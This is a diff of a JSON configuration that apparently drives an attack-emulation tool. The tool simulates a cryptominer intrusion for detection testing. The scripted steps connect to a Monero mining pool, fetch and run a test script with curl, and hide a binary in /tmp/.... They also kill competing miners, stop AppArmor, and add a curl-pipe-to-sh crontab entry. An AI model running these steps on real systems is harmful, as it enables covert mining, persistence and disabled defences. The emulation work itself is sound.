@@ -1,11 +1,12 @@
 [
   {
     "name": "CLEANUP",
-    "remove": [ "/tmp/.../" ]
+    "remove": [ "/tmp/.../", "/tmp/a.sh", "/tmp/art-fish.txt" ]
   },
   {
     "name": "CONNECT-POOL",
-    "fork-and-rename": [ "/tmp/.../miner", "-a ethash", "-o stratum+tcp://xmr.nanopool.org:443", "-u chain-reactor-miner-test" ],
+    "fork-and-rename": [ "miner", "-a", "ethash", "-o", "stratum+tcp://xmr.nanopool.org:443", "-u", "chain-reactor-miner-test", "exit" ],
+    "execve": [ "/tmp/.../miner", "exit" ],
     "connect": {
       "method": "socketcall",
       "protocol": "tcp4",
@@ -19,45 +20,39 @@
   },
   {
     "name": "DOWNLOAD-MINER",
-    "fork-and-rename": [ "curl", "-L", "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh", "-o", "a.sh" ],
-    "chmod": {
-      "path": "a.sh",
-      "mode": "777"
-    },
-    "fork-and-rename": [ "a.sh"  ]
+    "execveat": [ "curl", "-L", "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh", "-o", "/tmp/a.sh" ],
+    "chmod": { "path": "/tmp/a.sh", "mode": "777" },
+    "execve": [ "/tmp/a.sh" ]
   },
   {
     "name": "HIDE-MINER",
-    "fork-and-rename": [ "mkdir", "-p", "/tmp/..." ],
-    "chmod": {
-      "path": "/tmp/...",
-      "mode": "600"
-    },
+    "execveat": [ "mkdir", "-p", "/tmp/..." ],
     "copy": [ "/proc/self/exe", "/tmp/.../miner" ],
-    "fchmod": {
-      "path": "/tmp/.../miner",
-      "mode": "0700"
-    }
+    "chmod": { "path": "/tmp/.../miner", "mode": "0700" }
   },
   {
     "name": "KILL-COMPETITORS",
-    "fork-and-rename": [ "pkill", "-f", "xmrig"  ]
+    "fork-and-rename": [ "pkill", "-f", "xmrig" ]
   },
   {
     "name": "PERSIST-CRONTAB",
-    "file-append": {
-        "path": "/etc/crontab",
-        "backup-and-revert": true,
+    "file-create": {
+        "path": "/tmp/.../crontab",
+        "backup-and-revert": false,
         "data": "\n* * * * * curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh|sh\n"
-    }
+    },
+    "execveat": [ "sh", "-c", "'crontab -l > /tmp/.../crontab.bak'" ],
+    "execveat": [ "crontab", "/tmp/.../crontab"],
+    "execveat": [ "sleep", "60"],
+    "execveat": [ "crontab", "/tmp/.../crontab.bak"]
   },
   {
     "name": "RUN-MINER",
-    "fork-and-rename": [ "/tmp/.../miner", "exit"  ]
+    "execveat": [ "/tmp/.../miner", "exit"  ]
   },
   {
     "name": "STOP-SERVICES",
-    "fork-and-rename": [ "kill", "-9", "aliyun"  ],
+    "fork-and-rename": [ "kill", "-9", "aliyun" ],
     "fork-and-rename": [ "systemctl", "stop", "apparmor.service"  ]
   }
 ]
